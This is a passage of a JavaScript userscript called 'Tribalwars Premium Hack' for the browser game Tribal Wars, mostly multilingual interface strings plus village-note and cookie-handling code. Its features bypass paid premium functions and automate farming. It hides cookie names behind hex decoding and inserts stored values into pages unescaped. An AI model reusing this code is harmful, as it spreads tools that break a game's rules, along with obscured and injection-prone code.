			lang_screen_ally[3] = 'Tegenstander Verslagen:';
			lang_screen_ally[4] = 'Tegenstander Verslagen - Aanvaller:';
			lang_screen_ally[5] = 'Tegenstander Verslagen - Verdediger:';
			lang_screen_ally[6] = 'Statistieken van de stam';
							
			lang_farmar = 'Farmer';    
			lang_calc_reports = '» Bereken middelen en voeg het toe aan je boerderij';  
			
			lang_perfil[0] = '» Speler bestand';    
			lang_perfil[1] = '» Stam bestand';    
			lang_perfil[2] = '» Drop bestand';    
			lang_perfil[3] = '» Haal de informatie op van de speler in BB-code';  
			lang_perfil[4] = '» Reserveer Dorp';
			lang_perfil[5] = '» Globale statistieken';
			
			lang_farmer[0] = 'Farmer Instellingen';    
			lang_farmer[1] = 'Notitie: Dit script slaat data op in cookies. Als je de cookies van je browsers verwijdert, verwijder je ook alle instellingen van dit script.';    
			lang_farmer[2] = 'Coördinaten:';  
			lang_farmer[3] = '» Opslaan'; 
			
			lang_spear = 'Speervechter';    
			lang_sword = 'Zwaardvechter';    
			lang_axe = 'Bijlstrijder';    
			lang_archer = 'Boogschutter';    
			lang_spy = 'Verkenner';    
			lang_light = 'Lichte cavalerie';    
			lang_marcher = 'Mounted archer';    
			lang_heavy = 'Zware cavalerie';    
			lang_ram = 'Ram';    
			lang_catapult = 'Katapult';    
			lang_knight = 'Ridder';    
			lang_snob = 'Edelman';
			
			lang_villages_notes = 'Notities';

			lang_map[7] = 'Kleine kaart:';
			lang_map[8] = 'Kaart:';
			lang_map[9] = 'Wijzig kaart grootte';				
			
			lang_messages[0] = 'Tips "Tribalwars Premium Hack"';
			lang_messages[1] = 'Gebruik de tags <b>[img][/img]</b> om een beeld te insluiten';
			lang_messages[2] = 'Gebruik de tags <b>[vid][/vid]</b> insluiten van een youtube video';
			lang_messages[3] = 'Toestaan vrije HTML in berichten';
			lang_messages[4] = '* Alleen zij die hebben van het script kan bekijken';	
		}else{
		if (language == 'ae'){
			var warning = 'الاسكربت يعمل للمرة الاولى يجب عليك الذهاب للشكل العام من اجل لكي يعلم الاسكربت الاحداثيات.';  
			var lang_language = 'اللغة';  
			var lang_dados = 'سيرفر الاسكربت';  
			var lang_dados2= 'إذا حدث خطأ مع البرامج النصية، تغيير البرامج النصية الخادم';  
			var lang_search_villages = 'بحث عن قرى'; 
			var lang_distancia = 'المسافة: 0 الحقول';
			var lang_publicar = '';
			
			lang_bar[0] = 'المركز';  
			lang_bar[1] = 'تدريب';  
			lang_bar[2] = 'اسطبل';  
			lang_bar[3] = 'ورشة';  
			lang_bar[4] = 'الأكادمية';  
			lang_bar[5] = 'الحداد';  
			lang_bar[6] = 'نقطة التجمع';  
			lang_bar[7] = 'السوق';  
			lang_bar[8] = 'TWStats';  
			lang_bar[9] = 'جدول التطوير';

			lang_reports[0] = 'جميع التقارير';  
			lang_reports[1] = 'الهجمات';  
			lang_reports[2] = 'تقارير الدفاع ';  
			lang_reports[3] = 'دعم';  
			lang_reports[4] = 'تجارة';  
			lang_reports[5] = 'أخرى';  
			lang_reports[6] = 'تمرير';  
			lang_reports[7] = 'فلترة';  
			lang_reports[8] = 'تجاهل المرسل';  
			lang_reports[9] = 'نشر التقارير';

			lang_mail[0] = 'البريد';  
			lang_mail[1] = 'الرسائل العامة';  
			lang_mail[2] = 'كتابة رسالة';  
			lang_mail[3] = 'تجاهل مرسل';  
			lang_mail[4] = 'فهرس العناوين';

			lang_ally[0] = 'الرئيسة';  
			lang_ally[1] = 'ملف القبيلة';  
			lang_ally[2] = 'الاعضاء';  
			lang_ally[3] = 'العلاقات الدبلوماسية';  
			lang_ally[4] = 'الحروب ';  
			lang_ally[5] = 'مخطط حجز احتلال القري ';  
			lang_ally[6] = 'الدعوات';  
			lang_ally[7] = 'رسالة الترحيب';  
			lang_ally[8] = 'الخصائص';  
			lang_ally[9] = 'منتدى القبيلة';

			lang_ranking[0] = 'القبائل';  
			lang_ranking[1] = 'الاعبين';  
			lang_ranking[2] = 'القبائل في القارة';  
			lang_ranking[3] = 'الاعبين في القارة';  
			lang_ranking[4] = 'ترتيب افضل القبائل';  
			lang_ranking[5] = 'ترتيب افضل الاعبين';  
			lang_ranking[6] = 'الانجازات';  
			lang_ranking[7] = 'الحروب';

			lang_settings[0] = 'الملف الشخصي';  
			lang_settings[1] = 'خيارات';  
			lang_settings[2] = 'تغير الاميل';  
			lang_settings[3] = 'تغير الباسورد';  
			lang_settings[4] = 'بداية جديدة';  
			lang_settings[5] = 'حذف الحساب';  
			lang_settings[6] = 'اشعارات';  
			lang_settings[7] = 'الانجازات';  
			lang_settings[8] = 'اشتراك خط الانترنت';  
			lang_settings[9] = 'حضانة حساب';  
			lang_settings[10] = 'تسجيلات الدخول';  
			lang_settings[11] = 'الاستفتائات';  
			lang_settings[12] = 'دعوة الاعبين';  
			lang_settings[13] = 'التول بار';  
			lang_settings[14] = 'iPhone &amp; Android';  
			lang_settings[15] = 'تجاهل لاعب';  
			lang_settings[16] = 'الدعم الفني';  
			lang_settings[17] = 'عن الاسكربت';  
			lang_settings[18] = ' | تمت الترجمة بواسطة <b>Tayfor</b>';

			lang_premium[0] = 'استخدام النقاط';  
			lang_premium[1] = 'شراء نقاط التميز';  
			lang_premium[2] = 'نقل نقاط';  
			lang_premium[3] = 'السجل';

			lang_screen_settings[0] = 'قائمة الشكل العام';  
			lang_screen_settings[1] = 'Normal Mode: تحويل الى القرية في الشكل العام';  
			lang_screen_settings[2] = 'Direct Mode: التحويل الى القرية مباشرةً';  
			lang_screen_settings[3] = 'مجموعة الصور المتوفرة';  
			lang_screen_settings[4] = 'رابط ملف CSS:';  
			lang_screen_settings[5] = 'اظهار العالم في العنوان';  
			lang_screen_settings[6] = 'تفعيل ';  
			lang_screen_settings[7] = 'اغلاق';

			lang_screen_sobre[0] = 'الميزات';  
			lang_screen_sobre[1] = 'البار السريع الحيوي';  
			lang_screen_sobre[2] = 'البار السريع';  
			lang_screen_sobre[3] = 'معدّلة تلقائيا في الاسكربت ';  
			lang_screen_sobre[4] = 'الملاحظات في الشكل الاساسي';  
			lang_screen_sobre[5] = 'التنقل بالاسهم بين القرى';  
			lang_screen_sobre[6] = 'طريقة جديدة لتصدير التقارير';  
			lang_screen_sobre[7] = 'عن طريق BB codes او  html او صورة';  
			lang_screen_sobre[8] = 'جمع الموارد و الهجوم على القرية ';  
			lang_screen_sobre[9] = 'فقط في تقارير التجسس';  
			lang_screen_sobre[10] = 'تصدير معلومات الاعب في جدول';  
			lang_screen_sobre[11] = 'النهب من نقطة التجمع';  
			lang_screen_sobre[12] = 'اعدادات النهب لكل قرية لوحدها';  
			lang_screen_sobre[13] = 'البحث عن القرى من الخريطة لاضافتها للقائمة النهب ';  
			lang_screen_sobre[14] = 'المظهر الحي لقائمة القرى ';  
			lang_screen_sobre[15] = 'للتشغيل';  
			lang_screen_sobre[16] = 'الخريطة والخريطة المصغرة مع امكانية تعديلها';  
			lang_screen_sobre[17] = 'مجموعة الصور المتوفرة';  
			lang_screen_sobre[18] = 'اعداد مجموعة الصور المتوفرة';  
			lang_screen_sobre[19] = 'معلومات النسخة';  
			lang_screen_sobre[20] = '» النسخة الحالية:';  
			lang_screen_sobre[21] = 'Settings -> Settings';  
			lang_screen_sobre[22] = 'من معلومات الاعب او القرية او القبيلة';  
			lang_screen_sobre[23] = '» النسخة الآخيرة:';  
			lang_screen_sobre[24] = 'صقل الذهب آليا الى انتهاء كل الموارد';  
			lang_screen_sobre[25] = 'دخول القرى مباشرةً من الملف';  
			lang_screen_sobre[26] = 'اختيار سيرفر الاسكربت, في حال عدم عمله';  
			lang_screen_sobre[27] = 'الاحصائيات من ملف القبيلة';
			lang_screen_sobre[28] = 'خريطة في كامل الشاشة';
			lang_screen_sobre[29] = 'المسافة في الوقت الذي يستغرقه للوصول إلى كل القوات في القرية، يعمل في الملف الشخصى قرية';
			lang_screen_sobre[30] = 'معاينة الرسائل';
			
			lang_screen_ally[0] = 'النقاط:';  
			lang_screen_ally[1] = 'القرى:';  
			lang_screen_ally[2] = 'الاعضاء:';  
			lang_screen_ally[3] = 'نقاط الدفاع والهجوم:';  
			lang_screen_ally[4] = 'نقاط الهجوم:';  
			lang_screen_ally[5] = 'نقاط الدفاع:';  
			lang_screen_ally[6] = 'احصائيات القبيلة';  

			lang_report[0] = 'نسخ الجيوش في محاكي المعركة';
			lang_report[1] = 'نسخ عدد الجيوش الناجي الى محاكي المعركة';
			lang_report[2] = 'الهجوم مرة اخرى';
			lang_report[3] = 'الهجوم مرة اخرى بنفس الجيش';
			lang_report[4] = 'الهجوم مرة اخرى بكل الجيش';
			
			lang_farmar = 'الناهب';  
			lang_calc_reports = '» حساب الموارد ثم النهب';  

			lang_perfil[0] = '» ملف اللاعب';  
			lang_perfil[1] = '» ملف القبيلة';  
			lang_perfil[2] = '» ملف القرية';  
			lang_perfil[3] = '» تحويل معلومات الاعب لرمز BB codes ';  
			lang_perfil[4] = '» حجز القرية';  
			lang_perfil[5] = '» ملخص الإحصاءات';

			lang_farmer[0] = 'اعدادات الناهب';  
			lang_farmer[1] = 'ملاحظة: الاسكربت يحفظ البيانات في الكوكيز , احذر من مسح الكوكيز من المتصفح , لانه سوف يمسح الاعدادات من الاسكربت.';  
			lang_farmer[2] = 'الاحداثيات:';  
			lang_farmer[3] = '» حفظ';   

			lang_spear = 'مقاتل الرمح  ';  
			lang_sword = 'مقاتل سيف';  
			lang_axe = 'مقاتل الفاس';  
			lang_archer = 'رامي اسهم';  
			lang_spy = 'كشافة';  
			lang_light = 'فارس خفيف';  
			lang_marcher = 'فارس القوس';  
			lang_heavy = 'فارس ثقيل';  
			lang_ram = 'محطمة حائط';  
			lang_catapult = 'مقلاع';  
			lang_knight = 'قائد الفرسان';  
			lang_snob = 'نبيل'; 
			
			lang_villages_notes = 'الملاحظات';  

			lang_map[7] = 'الخريطة المصغرة:';  
			lang_map[8] = 'الخريطة:';  
			lang_map[9] = 'تغير حجم الخريطة'; 
			
			lang_messages[0] = 'نصائح الاسكربت';
			lang_messages[1] = 'قم باساخدام الكود [img][/img] لارفاق صورة';
			lang_messages[2] = 'قم باساخدام الكود [vid][/vid] لارفاق فيديو من اليوتيوب';
			lang_messages[3] = 'السماح باكوادال HTML في الرسائل مجاناً';
			lang_messages[4] = '* فقط من لديه الاسكربت يتستطيع رؤية ذلك';
		}else{
		if (language == 'cz'){
			var warning = 'Aby script pracoval správne prvýkrát mal by si ísť do náhľadu dedín, tak sa script načíta správne.';    
			var lang_language = 'Jazyk';    
			var lang_dados = 'Scriptovací server';    
			var lang_dados2= 'Ak by sa vyskitla chyba, zmeň server scriptu';  
			var lang_search_villages = 'Vyhledať dediny:';
			var lang_publicar = 'Konverter oznámení';
			
			lang_bar[0] = 'Hlavná Budova';    
			lang_bar[1] = 'Rekrutovať';    
			lang_bar[2] = 'Stajňa';    
			lang_bar[3] = 'Dielňa';    
			lang_bar[4] = 'Akadémia';    
			lang_bar[5] = 'Kováreň';    
			lang_bar[6] = 'Nádvorie';    
			lang_bar[7] = 'Trhovisko';    
			lang_bar[8] = 'DK Plus';    
			lang_bar[9] = 'Development Track';  

			lang_reports[0] = 'Všechna oznámení';  
			lang_reports[1] = 'Útoky';  
			lang_reports[2] = 'Obrana';  
			lang_reports[3] = 'Podpora';  
			lang_reports[4] = 'Obchod';  
			lang_reports[5] = 'Ostatní';  
			lang_reports[6] = 'Přeposláno';  
			lang_reports[7] = 'Filtr';  
			lang_reports[8] = 'Blokovat odesílatele';  
			lang_reports[9] = 'Veřejné oznámení';

			lang_mail[0] = 'Zprávy';  
			lang_mail[1] = 'Hromadný dopis';  
			lang_mail[2] = 'Napsat zprávu';  
			lang_mail[3] = 'Blokovat odesílatele';  
			lang_mail[4] = 'Adresár';

			lang_ally[0] = 'Náhled';  
			lang_ally[1] = 'Profil';  
			lang_ally[2] = 'Členové';    
			lang_ally[3] = 'Diplomacie';  
			lang_ally[4] = 'Kmeňové války';  
			lang_ally[5] = 'Rezervační systém';  
			lang_ally[6] = 'Rekrutovať';  
			lang_ally[7] = 'Pozdrav';  
			lang_ally[8] = 'Vlastnosti';  
			lang_ally[9] = 'Fórum kmene';

			lang_ranking[0] = 'Kmeny';  
			lang_ranking[1] = 'Hráči';  
			lang_ranking[2] = 'Kmeny na kontinentu';  
			lang_ranking[3] = 'Hráči na kontinentu';  
			lang_ranking[4] = 'Poražený kmenový protivník';  
			lang_ranking[5] = 'Poražený protivník';  
			lang_ranking[6] = 'Ocenění';  
			lang_ranking[7] = 'Kmenové války';

			lang_settings[0] = 'Profil';  
			lang_settings[1] = 'Nastavení';  
			lang_settings[2] = 'Oznámení';  
			lang_settings[3] = 'Zmeniť heslo';  
			lang_settings[4] = 'Začať znovu';  
			lang_settings[5] = 'Vymazať účet';  
			lang_settings[6] = 'Oznámení';  
			lang_settings[7] = 'Ocenění';  
			lang_settings[8] = 'Sdílení internetového spojení';  
			lang_settings[9] = 'Režim dovolená';  
			lang_settings[10] = 'Přihlášení';  
			lang_settings[11] = 'Průzkum';  
			lang_settings[12] = 'Pozvat hráče';  
			lang_settings[13] = 'Toolbar';  
			lang_settings[14] = 'iPhone & Android';  
			lang_settings[15] = 'Blokovat hráče';  
			lang_settings[16] = 'Dotaz na Support';  
			lang_settings[17] = 'O Scripte ?';  
			lang_settings [18] = ' | translated by <a target="blank">[M]ajky™</a>';

			lang_premium[0] = 'Nasadit';  
			lang_premium[1] = 'Koupit';  
			lang_premium[2] = 'Převod';  
			lang_premium[3] = 'Protokol';

			lang_screen_settings[0] = 'Náhľad Menu';  
			lang_screen_settings[1] = 'Normálny Mód: dediny sú otvorené v náhlade';  
			lang_screen_settings[2] = 'Zložitý Mód: dediny sú otvorené v tom istom okne ako predtým';  
			lang_screen_settings[3] = 'Grafické balíčky';  
			lang_screen_settings[4] = 'CSS link:';  
			lang_screen_settings[5] = 'Ukázať svet v hlavičke';  
			lang_screen_settings[6] = 'Povoliť';  
			lang_screen_settings[7] = 'Zakázať';

			lang_screen_sobre[0] = 'Funkcie Tribalwars Premium Hack';  
			lang_screen_sobre[1] = 'Dynamické Menu,panel';  
			lang_screen_sobre[2] = 'Premium panel';  
			lang_screen_sobre[3] = 'Upraviteľné v nastaveniach scriptu';  
			lang_screen_sobre[4] = 'Možnosť pridania poznámok ku každej dedine v náhľade';  
			lang_screen_sobre[5] = 'Šipky pre rýchlu zmenu dediny';  
			lang_screen_sobre[6] = 'Nová cesta ako zverejniť oznámenie';  
			lang_screen_sobre[7] = 'V BB-kódoch,html';  
			lang_screen_sobre[8] = 'Script na výpočet surovín a farmer plus hlásenie';  
			lang_screen_sobre[9] = 'Len v špionážnom hlásení';  
			lang_screen_sobre[10] = 'Automatický prehodí informácie hráča do tabuľky,v BB-kódoch';  
			lang_screen_sobre[11] = 'Script nájdete na nádvorí <b>(auto farmer BETA)</b>';  
			lang_screen_sobre[12] = 'Samostatné nastavenie pre každú dedinu';  
			lang_screen_sobre[13] = 'Script na vyhladávanie dedín k použitiu pre farmer';  
			lang_screen_sobre[14] = 'Dynamicke menu s názvami dedín';  
			lang_screen_sobre[15] = 'Uložiť mod do';  
			lang_screen_sobre[16] = 'Map & Minimap nastavenia';  
			lang_screen_sobre[17] = 'Grafické balíčky';  
			lang_screen_sobre[18] = 'Konfigurovať grafické balíčky v nastaveniach';  
			lang_screen_sobre[19] = 'Informácie o verzií';  
			lang_screen_sobre[20] = '» Aktuálna verzia:';  
			lang_screen_sobre[21] = 'Nastavenia -> Nastavenia';  
			lang_screen_sobre[22] = 'Form external hráčov, dedín alebo kmeňa';  
			lang_screen_sobre[23] = '» Posledná verzia:';  
			lang_screen_sobre[24] = 'Razenie mincí automaticky ak sú dostatočné suroviny';  
			lang_screen_sobre[25] = 'Rezervovanie dedín rovno z profilu dediny';  
			lang_screen_sobre[26] = 'Zmeň si v scripte server, ak aktuálny script nepodporuje server ,na ktorom hráš';  
			lang_screen_sobre[27] = 'Štatistika profilu kmeňa';   

			lang_screen_ally[0] = 'Body:';    
			lang_screen_ally[1] = 'Dediny:';    
			lang_screen_ally[2] = 'Členovia:';    
			lang_screen_ally[3] = 'OD:';    
			lang_screen_ally[4] = 'ODA:';    
			lang_screen_ally[5] = 'ODD:';    
			lang_screen_ally[6] = 'Kmeňová Štatistika';  

			lang_report[0] = 'Označ hlásenie od začiatku až po koniec a vlož to do prázdnej strany na pravo';  
			lang_report[1] = '» Publikovať na fórum';  
			lang_report[2] = 'Nastavenia';  
			lang_report[3] = 'Typ hlásenia';  
			lang_report[4] = 'Skryté fórum';  
			lang_report[5] = 'Hlavné forum';  
			lang_report[6] = 'Iné forum';  
			lang_report[7] = 'Grafická verzia';  
			lang_report[8] = 'Útočník:';  
			lang_report[9] = 'Obranca:';  
			lang_report[10] = 'Úkazať:';  
			lang_report[11] = 'Prihlásiť';  
			lang_report[12] = 'Informácie o dedine';  
			lang_report[13] = 'Jednotky';  
			lang_report[14] = 'Straty';  
			lang_report[15] = 'Viera';  
			lang_report[16] = 'Paladin';  
			lang_report[17] = 'Nepriateľov zničený - body:';  
			lang_report[18] = 'Útočník';  
			lang_report[19] = 'Obranca';  
			lang_report[20] = 'Hlavná budova:';  
			lang_report[21] = 'Suroviny';  
			lang_report[22] = 'Level budov';  
			lang_report[23] = 'Zmena oddanosti';  
			lang_report[24] = 'Sila spôsobená baranidlami';  
			lang_report[25] = 'Sila spôsobená katapultami';  
			lang_report[26] = 'Jednotky vonku  dediny';

			lang_farmar = 'Farmer';    
			lang_calc_reports = '» Vypočítať suroviny,pridať do Farmera';  

			lang_perfil[0] = '» História hráča';  
			lang_perfil[1] = '» História kmeňa';  
			lang_perfil[2] = '» Informácie o dedine';  
			lang_perfil[3] = '» Získať informácie hráča v BB-kódoch';  
			lang_perfil[4] = '» Rezervovať túto dedinu';
			lang_perfil[4] = 'Souhrnná statistika';

			lang_farmer[0] = 'Farmer Nastavenia';    
			lang_farmer[1] = 'Pozor!,tento script ukladá cookies, buď opatrný pri vymazávaní cookies, vymazalo by to všetky uložené nastavenia sciptu.';    
			lang_farmer[2] = ':Súradnice';    
			lang_farmer[3] = '» Uložiť';   

			lang_spear = 'Kopiník';  
			lang_sword = 'Mečiar';  
			lang_axe = 'Sekerník';  
			lang_archer = 'Lukostrelec';  
			lang_spy = 'Špeh';  
			lang_light = 'Ľahká kavaléria';  
			lang_marcher = 'Lukostrelci na koni';  
			lang_heavy = 'Ťažká kavaléria';  
			lang_ram = 'Baranidlo';  
			lang_catapult = 'Katapult';  
			lang_knight = 'Paladin';  
			lang_snob = 'Šlachtic';  

			lang_villages_notes = 'Poznámky';      

			lang_messages [0] = 'BB-Kódy TribalWars Premium Hack';    
			lang_messages [1] = 'Použi tagy <b>[img][/img]</b> na vloženie <b>obrázka</b>';    
			lang_messages [2] = 'Použi tagy <b>[vid][/vid]</b> na vloženie video z <b>youtube</b>';    
			lang_messages [3] = 'Vkládanie HTML v správe zadarmo';    
			lang_messages [4] = '* Len hráči,ktorý majú nainštalovaný tento script,môžu vidieť tagy';  
		} else {
		//if (language == 'en'){        
			var warning = 'For the script to work correctly the first time you should go for the views of villages, so that the script load the coordinates.';
			var lang_language = 'Language';
			var lang_dados = 'Scripts server';
			var lang_dados2= 'If an error occurs with the scripts, change the server scripts';
			var lang_search_villages = 'Search villages';
			var lang_distancia = 'Distance: 0 fields';
			var lang_publicar = 'Reports Converter';
			
			lang_bar[0] = 'Village Headquarters';
			lang_bar[1] = 'Recruit';
			lang_bar[2] = 'Stable';
			lang_bar[3] = 'Workshop';
			lang_bar[4] = 'Academy';
			lang_bar[5] = 'Smithy';
			lang_bar[6] = 'Rally point';
			lang_bar[7] = 'Market';
			lang_bar[8] = 'TWStats';
			lang_bar[9] = 'Development Track';
			
			lang_reports[0] = 'All reports';
			lang_reports[1] = 'Attacks';
			lang_reports[2] = 'Defenses';
			lang_reports[3] = 'Support';
			lang_reports[4] = 'Trade';
			lang_reports[5] = 'Miscellaneous';
			lang_reports[6] = 'Forwarded';
			lang_reports[7] = 'Filter';
			lang_reports[8] = 'Block sender';
			lang_reports[9] = 'Publicized reports';
			
			lang_mail[0] = 'Mail';
			lang_mail[1] = 'Circular mail';
			lang_mail[2] = 'Write message';
			lang_mail[3] = 'Block sender';
			lang_mail[4] = 'Address Book';
			
			lang_ally[0] = 'Overview';
			lang_ally[1] = 'Profile';
			lang_ally[2] = 'Members';
			lang_ally[3] = 'Diplomacy';
			lang_ally[4] = 'Wars';
			lang_ally[5] = 'Noble planner';
			lang_ally[6] = 'Recruitment';
			lang_ally[7] = 'Welcome';
			lang_ally[8] = 'Properties';
			lang_ally[9] = 'Tribal forum';

			lang_report[0] = 'Copy troops in the simulator';
			lang_report[1] = 'Copy number of troops survivor in the simulator';
			lang_report[2] = 'Attack again';
			lang_report[3] = 'Attack again with the same troops';
			lang_report[4] = 'Attack again with all troops';
			
			lang_ranking[0] = 'Tribes';
			lang_ranking[1] = 'Player';
			lang_ranking[2] = 'Continent Tribes';
			lang_ranking[3] = 'Continent Players';
			lang_ranking[4] = 'Opponents defeated tribal ranking';
			lang_ranking[5] = 'Opponents defeated';
			lang_ranking[6] = 'Awards';
			lang_ranking[7] = 'Wars';
			
			lang_settings[0] = 'Profile';
			lang_settings[1] = 'Settings';
			lang_settings[2] = 'Email address';
			lang_settings[3] = 'Change password';
			lang_settings[4] = 'Start over';
			lang_settings[5] = 'Delete account';
			lang_settings[6] = 'Notifications';
			lang_settings[7] = 'Awards';
			lang_settings[8] = 'Share Internet connection';
			lang_settings[9] = 'Account Sitting';
			lang_settings[10] = 'Logins';
			lang_settings[11] = 'Surveys';
			lang_settings[12] = 'Recruit player';
			lang_settings[13] = 'Toolbar';
			lang_settings[14] = 'iPhone &amp; Android';
			lang_settings[15] = 'Block player';
			lang_settings[16] = 'Support ticket';
			lang_settings[17] = 'About the script';
			lang_settings[18] = '';
			
			lang_premium[0] = 'Redeem';
			lang_premium[1] = 'Purchase';
			lang_premium[2] = 'Transfer';
			lang_premium[3] = 'Log';
			
			lang_screen_settings[0] = 'Overviews Menu';
			lang_screen_settings[1] = 'Normal Mode: the villages are open in the overview';
			lang_screen_settings[2] = 'Direct Mode: the villages are open the same view of the previous';
			lang_screen_settings[3] = 'Graphic Pack';
			lang_screen_settings[4] = 'CSS link:';
			lang_screen_settings[5] = 'Show world in title';
			lang_screen_settings[6] = 'Enable';
			lang_screen_settings[7] = 'Disable';
			
			lang_screen_sobre[0] = 'Functions';
			lang_screen_sobre[1] = 'Dynamic Menu Bar';
			lang_screen_sobre[2] = 'Premium Bar';
			lang_screen_sobre[3] = 'Editable directly in the script';
			lang_screen_sobre[4] = 'Notes in the villages to identify views';
			lang_screen_sobre[5] = 'Arrows to direct change of villages';
			lang_screen_sobre[6] = 'New way to report export';
			lang_screen_sobre[7] = 'In BB codes, html or image';
			lang_screen_sobre[8] = 'Script to calculate the resources and farmer the report';
			lang_screen_sobre[9] = 'Only in spy report';
			lang_screen_sobre[10] = 'Export profile information of a player on the table';
			lang_screen_sobre[11] = 'Script to farm located on the rally point';
			lang_screen_sobre[12] = 'Individual configuration for each village';
			lang_screen_sobre[13] = 'Script to search the villages on the map to use in conjunction with the script of to farm';
			lang_screen_sobre[14] = 'Dynamic views menu with list of villages';
			lang_screen_sobre[15] = 'Set open mode in';
			lang_screen_sobre[16] = 'Map & Minimap configurable';
			lang_screen_sobre[17] = 'Graphic Pack';
			lang_screen_sobre[18] = 'Configure Graphic Pack in';
			lang_screen_sobre[19] = 'Version Information';
			lang_screen_sobre[20] = '» Current version:';
			lang_screen_sobre[21] = 'Settings -> Settings';
			lang_screen_sobre[22] = 'Form external of player, village or tribe';
			lang_screen_sobre[23] = '» Last version:';
			lang_screen_sobre[24] = 'Minting gold coins automatically until exhaust the resources';
			lang_screen_sobre[25] = 'Reserve village directly from the profile of the itself';
			lang_screen_sobre[26] = 'Choice of scripts server on settings, if the scripts are not working';
			lang_screen_sobre[27] = 'Statistics on the tribe profile';						
			lang_screen_sobre[28] = 'Full Screen Map';
			lang_screen_sobre[29] = 'Distance in time that it takes to get each troop in the village, works in the profile of a village';
			lang_screen_sobre[30] = 'Preview message';

			
			lang_screen_ally[0] = 'Points:';
			lang_screen_ally[1] = 'Villages:';
			lang_screen_ally[2] = 'Members:';
			lang_screen_ally[3] = 'OD:';
			lang_screen_ally[4] = 'ODA:';
			lang_screen_ally[5] = 'ODD:';
			lang_screen_ally[6] = 'Tribe Stats';
								
			lang_farmar = 'Farmer';
			lang_calc_reports = '» Calculate Resources and to Farm';
			
			lang_perfil[0] = '» User file';
			lang_perfil[1] = '» Tribe file';
			lang_perfil[2] = '» Village file';
			lang_perfil[3] = '» Extract information from the player in BB code';
			lang_perfil[4] = '» Reserve Village';
			lang_perfil[5] = '» Global stats';
			
			lang_farmer[0] = 'Farmer Settings';
			lang_farmer[1] = 'Note: The script stores the data in cookies, be careful to erase cookies from your browser, it also clears the settings made by the script.';
			lang_farmer[2] = 'Coordinates:';
			lang_farmer[3] = '» Save';	
			
			lang_spear = 'Spear fighter';
			lang_sword = 'Swordsman';
			lang_axe = 'Axeman';
			lang_archer = 'Archer';
			lang_spy = 'Scout';
			lang_light = 'Light cavalry';
			lang_marcher = 'Mounted archer';
			lang_heavy = 'Heavy cavalry';
			lang_ram = 'Ram';
			lang_catapult = 'Catapult';
			lang_knight = 'Paladin';
			lang_snob = 'Nobleman';

			lang_map[7] = 'Mini map:';
			lang_map[8] = 'Map:';
			lang_map[9] = 'Change map size';
			
			lang_villages_notes = 'Notes';		

			lang_messages [0] = 'Tips Tribalwars Premium Hack';
			lang_messages [1] = 'Use tags <b>[img][/img]</b> to attach an <b>image</b>';
			lang_messages [2] = 'Use tags <b>[vid][/vid]</b> to attach a video from <b>youtube</b>';
			lang_messages [3] = 'Allow HTML in messages free';
			lang_messages [4] = '* Only those who have the script can view';
		}
		}
		}
		}

		localcs = getData(mundo + '_css');
		if (localcs.indexOf('.css') > -1) {
			localc = document.getElementsByTagName('link')[0];
			localcss = localc.href.substring(localc.href.indexOf('?'));
			localc.href = localcs + localcss;
		}
		
		visualizacoes = getData(mundo + '_visualizacoes');
		if (visualizacoes == 'direto') {
			direto_mode = ' checked';
			normal_mode = '';
		}
		else {
			direto_mode = '';
			normal_mode = ' checked';
		}
		plus = getCookie(gd.village.coord + '_plus');
		
		aldeias1 = '';
		aldeiasnome = '';
		
		if (gd.screen == 'overview_villages') {
			document.getElementById('production_table').getElementsByTagName('tr')[0].innerHTML += '<th width="7">' + lang_villages_notes + '</th>';
			document.getElementById('production_table').getElementsByTagName('th')[0].setAttribute('colspan', '2');
			aldeias = document.getElementById('production_table').getElementsByTagName('span');
			for (i = 0; i < aldeias.length; i++) {
				if (aldeias[i].id.indexOf('label_text_') > -1) {
					nome = trim(aldeias[i].textContent);
					if (nome.length > 34) {
						aldeiasnome += nome.substring(0, 19) + '... ' + nome.substring(nome.length - 13) + ' ** ';
					}
					else {
						aldeiasnome += nome + ' ** ';
					}
					aldeias1 += aldeias[i].id.substring(11) + ' ';
					aldeiacookie = getData(mundo + '_label_' + aldeias[i].id.substring(11));
					aldeias[i].parentNode.parentNode.parentNode.outerHTML += '<td><span id="_span_' + aldeias[i].id.substring(11) + '">' + aldeiacookie + '</span></td>';
					aldeias[i].parentNode.parentNode.parentNode.parentNode.innerHTML += '<td><span><input size="6" id="_edit_' + aldeias[i].id.substring(11) + '" value="' + aldeiacookie + '" onblur="' + str_setData + ' setCookie(game_data.world + \'_label_' + aldeias[i].id.substring(11) + '\', document.getElementById(\'_edit_' + aldeias[i].id.substring(11) + '\').value); document.getElementById(\'_span_' + aldeias[i].id.substring(11) + '\').textContent = document.getElementById(\'_edit_' + aldeias[i].id.substring(11) + '\').value;" onkeydown="if (event.keyCode == 13) {' + str_setData + ' setCookie(game_data.world + \'_label_' + aldeias[i].id.substring(11) + '\', document.getElementById(\'_edit_' + aldeias[i].id.substring(11) + '\').value); document.getElementById(\'_span_' + aldeias[i].id.substring(11) + '\').textContent = document.getElementById(\'_edit_' + aldeias[i].id.substring(11) + '\').value;}"></span></td>';
				}
			}
			setData(mundo + '_aldeias', trim(aldeias1));
			setData(mundo + '_aldeiasnome', aldeiasnome.substring(0, (aldeiasnome.length - 3)));
		}
		
		if (gd.screen == 'ally' || gd.screen == 'forum') {if (document.getElementById('content_value').getElementsByTagName('table')[0].getAttribute('class') == 'vis modemenu') {cc = document.getElementsByTagName('h2')[0].textContent} else {cc = ''}; setCookie(dhx('62635f37'), cc); if (gd.mode == 'profile') setCookie(dhx('62635f38'), document.getElementById('ally_content').getElementsByTagName('td')[4].textContent);}

		if (getCookie(mundo + '_warning') != 'ok') {
			if (gd.screen != 'overview_villages') {
				if (confirm(warning)) {
					setCookie(mundo + '_warning', 'ok');
					location.href = '/game.php?&screen=overview_villages';
				}
			}
			else {
				setCookie(mundo + '_warning', 'ok');
			}
		}
		meuArray = new Array();
		
		screen1 = location.href.replace(/.+?\?/, '').replace(/village=\d+/, '').replace(/^&/, '');
		
		VillId = String(gd.village.id);
		aldeias1 = getData(mundo + '_aldeias');
		if (aldeias1.length < 2) {
			aldeias1 = VillId;
		} else {
			meuArray = aldeias1.split(' ');
			aldeiasnome = getData(mundo + '_aldeiasnome');
			aldeiasnome1 = aldeiasnome.split(' ** ');
			modo = getData(mundo + '_visualizacoes');
			if (modo == 'direto') {
				screen2 = screen1;
					}
			else {
				screen2 = 'screen=overview';
			}
		}
		
		
		if (meuArray.indexOf(VillId) == -1) meuArray[0] = VillId;
		
		if (meuArray.indexOf(VillId) == -1) {
			if (gd.screen == 'overview_villages') {			
					setCookie(mundo + '_warning', 'ok');
			}
			else {
				if (confirm(warning)) {
